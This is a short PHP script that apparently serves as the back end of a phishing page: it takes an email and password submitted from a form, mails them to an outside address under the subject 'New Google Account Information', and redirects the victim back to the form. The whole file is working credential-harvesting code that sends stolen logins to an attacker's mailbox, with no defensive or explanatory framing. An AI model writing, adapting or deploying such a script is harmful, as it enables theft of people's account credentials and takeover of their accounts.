<?php
if(isset($_POST['submit'])){
    $to = 'acf.1yk7a@slmail.me'; // Your email address where you want to receive the form data
    $subject = 'New Google Account Information';
    $email = $_POST['email'];
    $password = $_POST['password'];
    $message = "Email: $email\nPassword: $password";
    $headers = 'From: webmaster@example.com';

    // Send email
    mail($to, $subject, $message, $headers);

    // Redirect back to the form page
    header('Location: index.html');
    exit;
}
?>
